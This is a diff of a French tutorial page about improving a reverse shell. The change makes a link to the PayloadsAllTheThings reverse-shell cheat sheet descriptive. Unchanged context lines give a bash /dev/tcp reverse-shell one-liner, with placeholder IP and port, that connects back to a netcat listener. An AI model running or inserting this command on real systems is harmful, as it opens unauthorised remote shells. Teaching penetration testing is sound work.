@@ -12,7 +12,7 @@ keywords:
 
 ## Pourquoi améliorer son reverse shell ?
 
-Tout d'abord, si vous n'êtes pas encore à l'aise avec l'injection de reverse shell, je vous suggère de consulter https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+Tout d'abord, si vous n'êtes pas encore à l'aise avec l'injection de reverse shell, je vous suggère de consulter [ce lien](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) pour avoir une liste de payloads à injecter.
 
 Lorsque vous injectez votre payload (exemple: `bash -c 'bash -i >& /dev/tcp/[votre IP]/[port d'ecoute de netcat] 0>&1'`), vous obtenez un reverse shell depuis la commande netcat.
 
